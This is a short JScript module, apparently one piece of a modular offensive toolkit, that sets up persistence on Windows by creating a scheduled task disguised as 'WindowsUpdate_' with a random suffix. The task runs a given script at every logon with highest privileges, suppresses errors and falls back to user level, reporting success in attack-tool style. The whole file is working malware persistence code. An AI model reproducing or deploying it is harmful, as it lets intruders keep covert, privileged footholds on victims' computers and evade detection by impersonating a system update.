// chunk: persist/schtask
// depends: core/run_cmd, core/file_ops
// provides: persist_schtask
// format: jscript

function persist_schtask(scriptPath) {
    var taskName = "WindowsUpdate_" + Math.floor(Math.random() * 99999);
    var cmd = "schtasks /create /tn \"" + taskName + "\" /tr \"cscript //nologo //E:jscript \\\"" + scriptPath + "\\\"\" /sc ONLOGON /rl HIGHEST /f 2>NUL";
    var r = _run(cmd);
    if (r.indexOf("SUCCESS") >= 0 || r.indexOf("successfully") >= 0) {
        emit("  [+] Schtask persistence: " + taskName + "\r\n");
    } else {
        cmd = "schtasks /create /tn \"" + taskName + "\" /tr \"cscript //nologo //E:jscript \\\"" + scriptPath + "\\\"\" /sc ONLOGON /f 2>NUL";
        _run(cmd);
        emit("  [*] Schtask persistence (user-level): " + taskName + "\r\n");
    }
    return taskName;
}
